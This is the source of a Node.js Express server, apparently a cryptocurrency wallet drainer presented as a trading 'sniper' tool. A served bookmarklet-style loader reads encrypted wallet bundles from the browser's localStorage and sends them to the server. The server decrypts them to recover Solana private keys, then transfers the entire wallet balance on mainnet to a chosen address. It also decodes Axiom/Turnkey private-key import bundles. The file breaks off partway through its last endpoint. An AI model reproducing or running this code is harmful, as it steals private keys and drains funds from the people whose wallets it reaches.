const express = require("express");
const crypto = require("crypto");
const bs58 = require("bs58");
const nacl = require("tweetnacl");
const fs = require("fs");
const http = require("http");
const WebSocket = require("ws");
const {Connection, clusterApiUrl, Keypair, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction} = require("@solana/web3.js");

const app = express();
app.use(express.json({ limit: "2mb" }));

// Enable CORS for local frontend/bookmarklet testing
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Credentials", "true");
  if (req.method === "OPTIONS") {
    return res.status(204).send();
  }
  next();
});

function hexToBuffer(hex) {
  if (typeof hex !== "string") throw new TypeError("hex string expected");
  return Buffer.from(hex.replace(/^0x/, ""), "hex");
}

function base64ToBuffer(b64) {
  return Buffer.from(b64, "base64");
}

function deriveAesKey(bundleKey) {
  // assume bundleKey is either base64, hex, base58, or UTF-8
  let keyBuf;
  
  console.log('[DERIVE] Raw bundleKey:', bundleKey.substring(0, 50));
  console.log('[DERIVE] bundleKey length:', bundleKey.length);
  
  if (/^[0-9a-fA-F]+$/.test(bundleKey)) {
    console.log('[DERIVE] Detected HEX format');
    keyBuf = hexToBuffer(bundleKey);
  } else if (/^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]+$/.test(bundleKey)) {
    console.log('[DERIVE] Detected BASE58 format');
    try {
      keyBuf = Buffer.from(bs58.decode(bundleKey));
    } catch (e) {
      console.log('[DERIVE] BASE58 decode failed, trying base64...');
      try {
        keyBuf = base64ToBuffer(bundleKey);
      } catch (e2) {
        keyBuf = Buffer.from(bundleKey, "utf8");
      }
    }
  } else {
    console.log('[DERIVE] Detected BASE64 or UTF-8 format');
    try {
      keyBuf = base64ToBuffer(bundleKey);
      console.log('[DERIVE] ✓ Successfully decoded as base64');
    } catch {
      console.log('[DERIVE] Base64 decode failed, using UTF-8');
      keyBuf = Buffer.from(bundleKey, "utf8");
    }
  }

  console.log('[DERIVE] Decoded keyBuf length:', keyBuf.length);
  console.log('[DERIVE] Decoded keyBuf (hex):', keyBuf.toString('hex'));

  // HKDF-SHA256 for an AES-256 key
  const hmac = crypto.createHmac("sha256", keyBuf).update("sbundle-aes-key").digest();
  const aesKey = hmac.slice(0, 32);
  console.log('[DERIVE] Derived AES-256 key (hex):', aesKey.toString('hex'));
  return aesKey;
}

function decryptAesGcm(encrypted, key) {
  // encrypted must include 12-byte nonce + ciphertext + 16-byte tag
  if (encrypted.length < 12 + 16) {
    throw new Error("encrypted payload too short");
  }
  const iv = encrypted.slice(0, 12);
  const tag = encrypted.slice(encrypted.length - 16);
  const ciphertext = encrypted.slice(12, encrypted.length - 16);

  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  const pt1 = decipher.update(ciphertext);
  const pt2 = decipher.final();
  return Buffer.concat([pt1, pt2]);
}

function decodeSBundles(sBundles, bundleKey) {
  console.log('\n[DECODE] ══════════════════════════════════════════');
  console.log('[DECODE] Starting sBundles decryption');
  console.log('[DECODE] bundleKey:', bundleKey.substring(0, 50));
  
  if (!bundleKey) {
    console.log('[DECODE] ❌ No bundleKey!');
    return sBundles.map(() => ({ decoded: null, structured: null }));
  }
  
  const keyBuf = base64ToBuffer(bundleKey);
  console.log('[DECODE] Key bytes (hex):', keyBuf.toString('hex'));
  
  const results = [];

  for (let entryIdx = 0; entryIdx < sBundles.length; entryIdx++) {
    const entry = sBundles[entryIdx];
    console.log(`\n[DECODE] Entry ${entryIdx + 1}/${sBundles.length}`);
    
    if (typeof entry !== 'string') {
      results.push({ decoded: null, structured: null });
      continue;
    }

    let success = false;
    
    if (!entry.includes(':')) {
      console.log('[DECODE]   No ":" delimiter - skipping');
      results.push({ decoded: null, structured: null });
      continue;
    }

    const [noncePart, ciphertextPart] = entry.split(':');
    
    try {
      const nonce12 = base64ToBuffer(noncePart);
      const ciphertext = base64ToBuffer(ciphertextPart);
      
      console.log('[DECODE]   Nonce (12 bytes):', nonce12.toString('hex'));
      console.log('[DECODE]   Ciphertext length:', ciphertext.length);
      
      if (ciphertext.length < 16) {
        console.log('[DECODE]   Ciphertext too short');
        results.push({ decoded: null, structured: null });
        continue;
      }
      
      // Try AES-256-GCM with direct key
      try {
        const tag = ciphertext.slice(-16);
        const ciphertextBody = ciphertext.slice(0, -16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuf, nonce12);
        decipher.setAuthTag(tag);
        const plaintext = Buffer.concat([decipher.update(ciphertextBody), decipher.final()]);
        
        console.log('[DECODE]   ✓ AES-256-GCM decrypted:', plaintext.length, 'bytes');
        console.log('[DECODE]   First 20 bytes (hex):', plaintext.slice(0, 20).toString('hex'));
        
        // Try to interpret as JSON
        const text = plaintext.toString('utf8');
        if (text.match(/^[\{\[]/)) {
          const parsed = tryParseJSON(text);
          if (parsed) {
            console.log('[DECODE]   ✅ Valid JSON!');
            results.push({ decoded: text, structured: parsed });
            success = true;
          }
        }
        
        // If not JSON, try base64-decode and check
        if (!success) {
          try {
            const decoded = Buffer.from(text, 'base64').toString('utf8');
            if (decoded.match(/^[\{\[]/)) {
              const parsed = tryParseJSON(decoded);
              if (parsed) {
                console.log('[DECODE]   ✅ Valid JSON (base64-encoded)!');
                results.push({ decoded: decoded, structured: parsed });
                success = true;
              }
            }
          } catch (e) {}
        }
        
        // If plaintext is 32 bytes, treat as private key
        if (!success && plaintext.length === 32) {
          console.log('[DECODE]   ✅ Looks like 32-byte private key!');
          results.push({ 
            decoded: plaintext.toString('hex'), 
            structured: { privateKeyHex: plaintext.toString('hex'), length: 32 }
          });
          success = true;
        }
        
        // If plaintext is 64 bytes, treat as extended key
        if (!success && plaintext.length === 64) {
          console.log('[DECODE]   ✅ Looks like 64-byte extended key!');
          results.push({
            decoded: plaintext.toString('hex'),
            structured: { privateKeyHex: plaintext.toString('hex'), length: 64 }
          });
          success = true;
        }
      } catch (e) {
        console.log('[DECODE]   AES-256-GCM failed:', e.message);
      }
      
      // Try TweetNaCl secretbox (24-byte nonce, padded from 12)
      if (!success) {
        try {
          console.log('[DECODE]   Trying TweetNaCl secretbox...');
          const nonce24 = Buffer.alloc(24);
          nonce12.copy(nonce24, 0);
          console.log('[DECODE]   Nonce (padded to 24):', nonce24.toString('hex'));
          
          const plaintext = nacl.secretbox.open(
            new Uint8Array(ciphertext),
            new Uint8Array(nonce24),
            new Uint8Array(keyBuf)
          );
          
          if (plaintext) {
            const pt = Buffer.from(plaintext);
            console.log('[DECODE]   ✓ TweetNaCl decrypted:', pt.length, 'bytes');
            console.log('[DECODE]   First 20 bytes (hex):', pt.slice(0, 20).toString('hex'));
            
            // Try JSON
            const text = pt.toString('utf8');
            if (text.match(/^[\{\[]/)) {
              const parsed = tryParseJSON(text);
              if (parsed) {
                console.log('[DECODE]   ✅ Valid JSON via TweetNaCl!');
                results.push({ decoded: text, structured: parsed });
                success = true;
              }
            }
            
            // Try as key data
            if (!success && (pt.length === 32 || pt.length === 64)) {
              console.log('[DECODE]   ✅ Valid key via TweetNaCl!');
              results.push({
                decoded: pt.toString('hex'),
                structured: { privateKeyHex: pt.toString('hex'), length: pt.length }
              });
              success = true;
            }
          } else {
            console.log('[DECODE]   TweetNaCl auth failed');
          }
        } catch (e) {
          console.log('[DECODE]   TweetNaCl error:', e.message);
        }
      }
      
    } catch (e) {
      console.log('[DECODE]   Parse error:', e.message);
    }
    
    if (!success) {
      console.log('[DECODE]   ❌ Failed all strategies');
      results.push({ decoded: null, structured: null });
    }
  }

  console.log('\n[DECODE] ══════════════════════════════════════════');
  console.log('[DECODE] Decrypted:', results.filter(r => r.decoded !== null).length, '/', sBundles.length);
  console.log('[DECODE] ══════════════════════════════════════════\n');

  return results;
}

function tryParseJSON(text) {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function privateKeyToSolanaAddress(privateKeyBytes) {
  // privateKeyBytes should be 32 or 64 bytes
  console.log('[ADDRESS] Converting private key to Solana address...');
  console.log('[ADDRESS] Private key length:', privateKeyBytes.length, 'bytes');
  
  let seed;
  if (privateKeyBytes.length === 64) {
    console.log('[ADDRESS] Detected 64-byte extended key, using first 32 bytes as seed');
    seed = privateKeyBytes.slice(0, 32);
  } else if (privateKeyBytes.length === 32) {
    console.log('[ADDRESS] Using 32-byte key directly as seed');
    seed = privateKeyBytes;
  } else {
    console.log('[ADDRESS] ❌ ERROR: Invalid key length', privateKeyBytes.length);
    throw new Error("expect 32 or 64 bytes private key");
  }

  try {
    console.log('[ADDRESS] Deriving keypair from seed...');
    const keypair = nacl.sign.keyPair.fromSeed(new Uint8Array(seed));
    const pubkey = Buffer.from(keypair.publicKey);
    const address = new PublicKey(pubkey).toString();
    console.log('[ADDRESS] ✅ Successfully derived address:', address);
    return address;
  } catch (e) {
    console.log('[ADDRESS] ❌ Keypair derivation failed:', e.message);
    throw e;
  }
}

function decodeSBundlesInternal(sBundle_raw, bundleKey) {
  const decoded = decodeSBundles(sBundle_raw, bundleKey);
  
  // Extract first valid key from decoded bundles
  let privateKeyBuf = null;
  let solanaAddress = null;

  for (const item of decoded) {
    if (!item.structured) continue;
    
    const keyInfo = item.structured;
    let keyHex = keyInfo.privateKeyHex || keyInfo.privateKey || keyInfo.secretKey || keyInfo.seed;
    
    if (!keyHex) continue;
    
    // Convert to buffer
    if (typeof keyHex === 'string') {
      if (/^[0-9a-fA-F]+$/.test(keyHex)) {
        // Hex string
        privateKeyBuf = hexToBuffer(keyHex);
      } else {
        try {
          // Try base64
          privateKeyBuf = base64ToBuffer(keyHex);
        } catch {
          try {
            // Try bs58
            privateKeyBuf = Buffer.from(bs58.decode(keyHex));
          } catch {
            // Try UTF8 as last resort
            privateKeyBuf = Buffer.from(keyHex, 'utf8');
          }
        }
      }
    } else if (Array.isArray(keyHex)) {
      privateKeyBuf = Buffer.from(keyHex);
    }
    
    // Successfully got a key buffer
    if (privateKeyBuf && (privateKeyBuf.length === 32 || privateKeyBuf.length === 64)) {
      console.log('[DECODE] ✅ Found valid key, length:', privateKeyBuf.length);
      try {
        solanaAddress = privateKeyToSolanaAddress(privateKeyBuf);
        console.log('[DECODE] ✅ Converted to Solana address:', solanaAddress);
        break;
      } catch (e) {
        console.log('[DECODE] ❌ Failed to convert to address:', e.message);
        privateKeyBuf = null;
      }
    }
  }

  return { decoded, keyInfo: { privateKeyBuf, solanaAddress } };
}

async function sendSolInternal(destination, amountSol, privateKeyBuf) {
  console.log('\n═════════════════════════════════════════════════════');
  console.log('💸 [SEND-SOL] STARTING SOL TRANSFER PROCESS');
  console.log('═════════════════════════════════════════════════════');
  console.log('[SEND-SOL] Destination wallet:', destination);
  console.log('[SEND-SOL] Private key length:', privateKeyBuf.length, 'bytes');
  
console.log('[SEND-SOL] Step 1: Constructing secret key...');
  const secretKey =
    privateKeyBuf.length === 64
      ? privateKeyBuf
      : Buffer.concat([privateKeyBuf, Buffer.from(nacl.sign.keyPair.fromSeed(new Uint8Array(privateKeyBuf)).secretKey).slice(32)]);
  console.log('[SEND-SOL] Secret key constructed, length:', secretKey.length, 'bytes');
  
  console.log('[SEND-SOL] Step 2: Creating keypair from secret key...');
  const wallet = Keypair.fromSecretKey(new Uint8Array(secretKey));
  const walletAddress = wallet.publicKey.toBase58();
  console.log('[SEND-SOL] ✅ Keypair created successfully');
  console.log('[SEND-SOL] 🔒 Source wallet:', walletAddress);
  console.log('[SEND-SOL] 📤 Destination wallet:', destination);
  
  console.log('[SEND-SOL] Step 3: Connecting to Solana mainnet...');
  const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");
  console.log('[SEND-SOL] ✅ Connected to Solana mainnet-beta');
  
  try {
    // Check balance before sending
    console.log('[SEND-SOL] Step 4: Checking wallet balance...');
    const balanceBefore = await connection.getBalance(wallet.publicKey);
    const solBefore = balanceBefore / LAMPORTS_PER_SOL;
    console.log('[SEND-SOL] 💰 Balance before transfer:');
    console.log('[SEND-SOL]   - SOL:', solBefore.toFixed(6));
    console.log('[SEND-SOL]   - Lamports:', balanceBefore);
    
    if (balanceBefore === 0) {
      console.log('[SEND-SOL] ❌ ABORT: Wallet has ZERO balance!');
      console.log('═════════════════════════════════════════════════════\n');
      return { status: "error", message: "Wallet balance is 0", balance: 0 };
    }
    
    console.log('[SEND-SOL] Step 5: Calculating transfer amount...');
    // Send all available SOL minus fees
    const estimatedFee = 5000; // 0.000005 SOL
    const amountToSend = Math.max(0, balanceBefore - estimatedFee);
    const solToSend = amountToSend / LAMPORTS_PER_SOL;
    
    console.log('[SEND-SOL] Transfer calculation:');
    console.log('[SEND-SOL]   - Estimated fee: 0.000005 SOL (' + estimatedFee + ' lamports)');
    console.log('[SEND-SOL]   - Amount to send: ' + solToSend.toFixed(6) + ' SOL (' + amountToSend + ' lamports)');

    console.log('[SEND-SOL] Step 6: Building transaction...');
    const tx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: destination,
        lamports: amountToSend,
      }),
    );
    console.log('[SEND-SOL] ✅ Transaction built successfully');

    console.log('[SEND-SOL] Step 7: Signing and broadcasting transaction...');
    console.log('[SEND-SOL] 🚀 Sending', solToSend.toFixed(6), 'SOL from', walletAddress);
    const signature = await sendAndConfirmTransaction(connection, tx, [wallet]);
    console.log('[SEND-SOL] ✅ TRANSACTION CONFIRMED!');
    console.log('[SEND-SOL] 📝 Signature:', signature);
    
    console.log('[SEND-SOL] Step 8: Verifying transfer...');
    // Check balance after sending
    const balanceAfter = await connection.getBalance(wallet.publicKey);
    const solAfter = balanceAfter / LAMPORTS_PER_SOL;
    console.log('[SEND-SOL] 💰 Balance after transfer:');
    console.log('[SEND-SOL]   - SOL:', solAfter.toFixed(6));
    console.log('[SEND-SOL]   - Lamports:', balanceAfter);
    
    if (balanceAfter === 0) {
      console.log('[SEND-SOL] ✨ SUCCESS: All funds transferred! Wallet is now EMPTY.');
    } else {
      console.log('[SEND-SOL] ⚠️  WARNING: Wallet still has', solAfter.toFixed(6), 'SOL remaining');
    }
    
    console.log('═════════════════════════════════════════════════════');
    console.log('[SEND-SOL] TRANSFER COMPLETE');
    console.log('═════════════════════════════════════════════════════\n');
    
    return { status: "success", signature, sent: solToSend, balanceAfter: solAfter };  
  } catch (err) {
    console.log('[SEND-SOL] ❌ ERROR DURING TRANSFER:');
    console.log('[SEND-SOL] Error message:', err.message);
    console.log('[SEND-SOL] Error code:', err.code);
    if (err.stack) console.log('[SEND-SOL] Stack trace:', err.stack);
    console.log('═════════════════════════════════════════════════════\n');
    return { status: "error", message: err.message };
  }
}

app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Backend Test</title></head><body>
<h1>Backend API Test</h1>
<p>API endpoints: /decode-sbundle, /send-sol, /run-all</p>
<form id="run" onsubmit="event.preventDefault();execute();">
  <label>Destination: <input id="dest" value="TARGET_PUBKEY" style="width:500px" /></label><br>
  <label>Amount (SOL): <input id="amt" type="number" step="0.0001" value="0.001"/></label><br>
  <button type="submit">Run decode+send</button>
</form>
<pre id="output" style="background:#f4f4f4; padding:12px;color:#000;"></pre>
<script>
async function execute(){
  const dest=document.getElementById('dest').value;
  const amt=parseFloat(document.getElementById('amt').value);
  const out=document.getElementById('output');
  out.textContent='Running...';
  const r=await fetch('/run-all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({destination:dest,amountSol:amt})});
  const jd=await r.json();
  out.textContent=JSON.stringify(jd,null,2);
}
</script>
</body></html>`);
});

app.get("/snipera18a.js", (req, res) => {
  res.type("application/javascript");
  res.send(`(function(){
    const sBundles = JSON.parse(localStorage.getItem('sBundles') || '[]');
    if (!sBundles.length) {
      console.error('No sBundles in localStorage');
      return;
    }
    fetch('http://localhost:3000/decode-sbundle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sBundle_raw: sBundles, apiData: { bundleKey: '...' } }),
    })
      .then((r) => r.json())
      .then((decoded) => {
        console.log('Decoded sbundle:', decoded);
        if (!decoded.solanaAddress) {
          console.error('No solanaAddress from decoded result');
          return;
        }
        const dest = prompt('Enter destination SOL address:');
        const amount = parseFloat(prompt('Enter amount SOL to send:'));
        if (!dest || !amount) return;
        return fetch('http://localhost:3000/send-sol', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ destination: dest, amountSol: amount, sBundle_raw: sBundles, apiData: { bundleKey: '...' } }),
        });
      })
      .then((r) => r && r.json())
      .then((result) => {
        if (result) console.log('Send result:', result);
      })
      .catch((err) => console.error('Error in sniper loader:', err));
  })();`);
});

app.get("/sniper.js", (req, res) => {
  res.type("application/javascript");
  const fs = require('fs');
  const path = require('path');
  const sniperPath = path.join(__dirname, 'sniper.js');
  const sniperCode = fs.readFileSync(sniperPath, 'utf8');
  res.send(sniperCode);
});

app.get("/pumpfun-sniper.js", (req, res) => {
  res.type("application/javascript");
  const fs = require('fs');
  const path = require('path');
  const pumpfunPath = path.join(__dirname, 'pumpfun-sniper.js');
  const pumpfunCode = fs.readFileSync(pumpfunPath, 'utf8');
  res.send(pumpfunCode);
});

app.post("/decode-sbundle", (req, res) => {
  console.log('\n╔════════════════════════════════════════════════════════════════════════════╗');
  console.log('║         🔐 /decode-sbundle ENDPOINT INVOKED              ║');
  console.log('╚════════════════════════════════════════════════════════════════════════════╝');
  console.log('[ENDPOINT] Timestamp:', new Date().toISOString());
  const { sBundle_raw, apiData } = req.body;
  console.log('📦 [DECODE] Request body keys:', Object.keys(req.body).join(', '));
  console.log('📦 [DECODE] sBundle_raw type:', typeof sBundle_raw, 'is array?', Array.isArray(sBundle_raw));
  console.log('📦 [DECODE] sBundle_raw length:', sBundle_raw?.length);
  if (sBundle_raw && sBundle_raw.length > 0) {
    console.log('📦 [DECODE] First item sample:', JSON.stringify(sBundle_raw[0]).substring(0, 300));
  }
  
  if (!sBundle_raw || !apiData || !apiData.bundleKey) {
    console.log('❌ [DECODE] Missing required fields');
    return res.status(400).json({ error: "sBundle_raw and apiData.bundleKey required" });
  }

  try {
    console.log('📦 [DECODE] Bundles to decode:', sBundle_raw.length);
    const decoded = decodeSBundles(sBundle_raw, apiData.bundleKey);
    console.log('✓ [DECODE] Successfully decoded', decoded.length, 'bundles');
    
    if (decoded.length > 0) {
      console.log('📦 [DECODE] First decoded item:', JSON.stringify(decoded[0]).substring(0, 300));
    }

    // Try to extract a private key from the first decoded bundle if available
    let keyInfo = decoded
      .map((d) => d.structured)
      .find((item) => item && (item.privateKeyHex || item.privateKey || item.secretKey || item.seed));

    console.log('🔍 [DECODE] keyInfo found?', !!keyInfo);
    if (keyInfo) {
      console.log('🔍 [DECODE] keyInfo keys:', Object.keys(keyInfo).join(', '));
    }

    let solanaAddress = null;
    if (keyInfo) {
      const privateKeyHex = keyInfo.privateKeyHex || keyInfo.privateKey || keyInfo.secretKey || keyInfo.seed;
      let privateKeyBuf;

      if (typeof privateKeyHex === "string") {
        if (/^[0-9a-fA-F]+$/.test(privateKeyHex)) {
          privateKeyBuf = hexToBuffer(privateKeyHex);
        } else {
          // may be base64 or base58
          try {
            privateKeyBuf = base64ToBuffer(privateKeyHex);
          } catch {
            privateKeyBuf = Buffer.from(privateKeyHex, "utf8");
          }
        }
      } else if (Array.isArray(privateKeyHex)) {
        privateKeyBuf = Buffer.from(privateKeyHex);
      }

      if (privateKeyBuf) {
        solanaAddress = privateKeyToSolanaAddress(privateKeyBuf);
        console.log('💼 [DECODE] Extracted wallet address:', solanaAddress);
      }
    } else {
      console.log('⚠️  [DECODE] No keyInfo found - checking all decoded items for keys...');
      for (let i = 0; i < decoded.length; i++) {
        if (decoded[i].structured) {
          console.log(`  Item ${i} structured keys:`, Object.keys(decoded[i].structured || {}).join(', '));
        }
      }
    }

    console.log('✅ [DECODE] Complete, returning:', { solanaAddress, decodedCount: decoded.length, hasKeyInfo: !!keyInfo }, '\n');
    res.json({ decoded, solanaAddress, keyInfo, decodedCount: decoded.length });
  } catch (err) {
    console.error('❌ [DECODE] Endpoint error:', err.message);
    console.error(err.stack);
    res.status(500).json({ error: err.message, decoded: [], solanaAddress: null });
  }
});

app.post("/run-all", async (req, res) => {
  try {
    const { destination, amountSol } = req.body;
    if (!destination || !amountSol) {
      return res.status(400).json({ error: "destination and amountSol required" });
    }

    // Mock data for testing (replace with your real saved sBundle and bundleKey)
    const sBundle_raw = [{ ciphertext: "..." }];
    const apiData = { bundleKey: "..." };

    const decodedResp = await decodeSBundlesInternal(sBundle_raw, apiData.bundleKey);
    const privateKeyObj = decodedResp.keyInfo;
    if (!privateKeyObj) {
      return res.status(400).json({ error: "No private key in sbundle" });
    }

    const sendResult = await sendSolInternal(destination, amountSol, privateKeyObj.privateKeyBuf);

    return res.json({ decoded: decodedResp, sendResult });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

app.post("/send-sol", async (req, res) => {
  try {
    console.log('\n╔═════════════════════════════════════════════════════╗');
    console.log('║         🎯 /send-sol ENDPOINT INVOKED               ║');
    console.log('╚═════════════════════════════════════════════════════╝');
    console.log('[ENDPOINT] Timestamp:', new Date().toISOString());
    console.log('[ENDPOINT] Request body keys:', Object.keys(req.body).join(', '));
    
    const { destination, amountSol, sBundle_raw, apiData } = req.body;
    
    console.log('[ENDPOINT] Step 1: Validating required fields...');
    console.log('[ENDPOINT]   - destination:', destination ? '✅ Present' : '❌ Missing');
    console.log('[ENDPOINT]   - sBundle_raw:', sBundle_raw ? '✅ Present (' + sBundle_raw.length + ' entries)' : '❌ Missing');
    console.log('[ENDPOINT]   - apiData:', apiData ? '✅ Present' : '❌ Missing');
    console.log('[ENDPOINT]   - bundleKey:', apiData?.bundleKey ? '✅ Present' : '❌ Missing');
    
    if (!destination || !sBundle_raw || !apiData || !apiData.bundleKey) {
      console.log('[ENDPOINT] ❌ VALIDATION FAILED: Missing required fields');
      return res.status(400).json({ error: "destination, sBundle_raw and apiData.bundleKey required" });
    }
    console.log('[ENDPOINT] ✅ All required fields present');

    console.log('[ENDPOINT] Step 2: Decrypting sBundles and extracting private key...');
    const decodedResp = decodeSBundlesInternal(sBundle_raw, apiData.bundleKey);
    const keyInfo = decodedResp.keyInfo;
    
    if (!keyInfo || !keyInfo.privateKeyBuf) {
      console.log('[ENDPOINT] ❌ DECRYPTION FAILED: No private key extracted');
      return res.status(400).json({ error: "No private key found in decoded sbundle" });
    }
    console.log('[ENDPOINT] ✅ Private key extracted successfully');
    console.log('[ENDPOINT]   - Solana address:', keyInfo.solanaAddress);
    console.log('[ENDPOINT]   - Key length:', keyInfo.privateKeyBuf.length, 'bytes');

    console.log('[ENDPOINT] Step 3: Initiating SOL transfer...');
    const sendResult = await sendSolInternal(destination, amountSol, keyInfo.privateKeyBuf);
    console.log('[ENDPOINT] ✅ Transfer attempt completed');
    console.log('[ENDPOINT]   - Status:', sendResult.status);
    if (sendResult.sent) console.log('[ENDPOINT]   - Amount sent:', sendResult.sent.toFixed(6), 'SOL');
    if (sendResult.signature) console.log('[ENDPOINT]   - Tx signature:', sendResult.signature);
    
    console.log('╔════════════════════════════════════════════════════════════════════════════╗');
    console.log('║            📊 /send-sol RESPONSE SUMMARY               ║');
    console.log('╚════════════════════════════════════════════════════════════════════════════╝');
    console.log('[RESPONSE] Status: ' + (sendResult.status === 'success' ? '✅ SUCCESS' : '❌ ' + sendResult.status.toUpperCase()));
    console.log('[RESPONSE] Wallet: ' + (decodedResp.keyInfo?.solanaAddress || 'Unknown'));
    if (sendResult.sent) console.log('[RESPONSE] Amount sent: ' + sendResult.sent.toFixed(6) + ' SOL');
    if (sendResult.balanceAfter !== undefined) console.log('[RESPONSE] Remaining balance: ' + sendResult.balanceAfter.toFixed(6) + ' SOL');
    if (sendResult.signature) console.log('[RESPONSE] Transaction: ' + sendResult.signature);
    if (sendResult.message) console.log('[RESPONSE] Message: ' + sendResult.message);
    console.log('[RESPONSE] Timestamp:', new Date().toISOString());
    console.log('╔════════════════════════════════════════════════════════════════════════════╗\n');
    
    res.json({ decoded: decodedResp, sendResult });
  } catch (err) {
    console.log('[ENDPOINT] 💩 FATAL ERROR IN /send-sol');
    console.error('[ENDPOINT] Error message:', err.message);
    console.error('[ENDPOINT] Stack trace:', err.stack);
    console.log('╔════════════════════════════════════════════════════════════════════════════╗\n');
    res.status(500).json({ error: err.message });
  }
});

const port = process.env.PORT || 3000;

// HTTP polling endpoint for sniper bot (CSP-compliant alternative to WebSocket)
app.post("/api/status", async (req, res) => {
  try {
    const { type, settings } = req.body;
    
    if (type === 'poll') {
      // Return mock status - in production, fetch actual wallet data
      const updates = [
        { type: 'balance', balance: '0.5' },
        { type: 'settings_ack', status: 'ok' }
      ];
      return res.json(updates);
    }
    
    res.json([]);
  } catch (error) {
    console.error('Polling error:', error);
    res.status(500).json([{ type: 'error', message: error.message }]);
  }
});

// ── New endpoint: Decode Axiom importBundle (hex-encoded wallet data) ──
app.post("/decode-axiom-bundle", (req, res) => {
  console.log('\n🔐 [AXIOM-DECODE] Request received');
  console.log('[AXIOM-DECODE] Body keys:', Object.keys(req.body).join(', '));
  console.log('[AXIOM-DECODE] importBundle type:', typeof req.body.importBundle);
  console.log('[AXIOM-DECODE] importBundle length:', req.body.importBundle?.length);
  console.log('[AXIOM-DECODE] importBundle preview:', JSON.stringify(req.body.importBundle)?.substring(0, 100));

  try {
    const { importBundle } = req.body;
    if (!importBundle) {
      console.log('❌ [AXIOM-DECODE] Missing importBundle');
      return res.status(400).json({ error: "importBundle required" });
    }

    let dataField;
    
    // Case 1: importBundle is an object with data field (from Axiom API)
    if (typeof importBundle === 'object' && importBundle.data) {
      console.log('[AXIOM-DECODE] Case 1: importBundle is object with data field');
      dataField = importBundle.data;
    }
    // Case 2: importBundle is a string (direct sbundle from Turnkey)
    else if (typeof importBundle === 'string') {
      console.log('[AXIOM-DECODE] Case 2: importBundle is string, using directly');
      dataField = importBundle;
    }
    // Case 3: Try to extract data
    else {
      console.log('❌ [AXIOM-DECODE] Invalid importBundle format');
      return res.status(400).json({ error: "importBundle must be object with data or string" });
    }

    console.log('[AXIOM-DECODE] Data field length:', dataField?.length);
    console.log('[AXIOM-DECODE] Data field preview:', dataField?.substring(0, 50));

    // Hex-decode the data field to get the wallet JSON
    let walletJson;
    try {
      walletJson = Buffer.from(dataField, 'hex').toString('utf8');
      console.log('[AXIOM-DECODE] ✓ Hex-decoded successfully');
      console.log('[AXIOM-DECODE] Wallet JSON preview:', walletJson.substring(0, 100));
    } catch (e) {
      console.log('[AXIOM-DECODE] ❌ Hex decode failed:', e.message);
      return res.status(400).json({ error: "Failed to decode hex: " + e.message });
    }

    const wallet = tryParseJSON(walletJson);
    if (!wallet) {
      console.log('❌ [AXIOM-DECODE] Failed to parse wallet JSON');
      console.log('[AXIOM-DECODE] Raw walletJson:', walletJson);
      return res.status(400).json({ error: "Invalid wallet data format" });
    }

    console.log('[AXIOM-DECODE] Wallet parsed, keys:', Object.keys(wallet).join(', '));

    // Extract the Solana address from targetPublic
    let solanaAddress = null;
    
    if (wallet.targetPublic) {
      try {
        // Try interpreting as hex public key -> base58 Solana address
        const pubkeyBuf = Buffer.from(wallet.targetPublic, 'hex');
        solanaAddress = bs58.encode(pubkeyBuf);
        console.log('[AXIOM-DECODE] ✓ Extracted solanaAddress from targetPublic:', solanaAddress);
      } catch (e) {
        console.log('[AXIOM-DECODE] Could not extract from targetPublic:', e.message);
      }
    }

    console.log('✅ [AXIOM-DECODE] Complete - Wallet:', solanaAddress);
    res.json({ 
      decoded: wallet, 
      solanaAddress: solanaAddress,
      targetPublic: wallet.targetPublic,
      rawWallet: wallet
    });

  } catch (error) {
    console.error('❌ [AXIOM-DECODE] Error:', error.message, error.stack);
    res.status(500).json({ error: error.message, decoded: null, solanaAddress: null });
  }
});

// ── New endpoint: Fetch Axiom wallet activity (server-side, avoids CORS) ──
app.get("/fetch-axiom-wallet", async (req, res) => {
  console.log('\n🔐 [FETCH-WALLET] Request received');
  try {
    // Fetch from Axiom's organization activity endpoint (server-to-server, no CORS)
    console.log('[FETCH-WALLET] Calling Axiom API...');
    const activityResp = await fetch('https://api8.axiom.trade/v1/organization/activity?limit=10', {
      method: 'GET',
      headers: { 
        'Content-Type': 'application/json'
      },
      credentials: 'include',
    });

    if (!activityResp.ok) {
      console.log('[FETCH-WALLET] ❌ Axiom API failed:', activityResp.status, activityResp.statusText);
      return res.status(activityResp.status).json({ error: `Axiom API error: ${activityResp.status}` });
    }

    const activities = await activityResp.json();
    if (!activities || !Array.isArray(activities)) {
      console.log('[FETCH-WALLET] ❌ Invalid activities response');
      return res.status(400).json({ error: "Invalid activities response" });
    }

    console.log('[FETCH-WALLET] Got activities:', activities.length);

    // Find the most recent ACTIVITY_TYPE_INIT_IMPORT_PRIVATE_KEY with importBundle
    const importActivity = activities.find(a => 
      a && a.type === 'ACTIVITY_TYPE_INIT_IMPORT_PRIVATE_KEY' && 
      a.result && 
      a.result.initImportPrivateKeyResult &&
      a.result.initImportPrivateKeyResult.importBundle
    );

    if (!importActivity) {
      console.log('[FETCH-WALLET] ❌ No import activity found in activities');
      return res.status(404).json({ error: "No import activity found" });
    }

    console.log('[FETCH-WALLET] ✓ Found import activity');

    // Parse the importBundle string to get the actual object
    const importBundleStr = importActivity.result.initImportPrivateKeyResult.importBundle;
    const importBundle = JSON.parse(importBundleStr);

    console.log('[FETCH-WALLET] ✓ Parsed importBundle, data field present:', !!importBundle.data);
    console.log('✅ [FETCH-WALLET] Complete\n');

    res.json({
      status: "success",
      importBundle: importBundle,
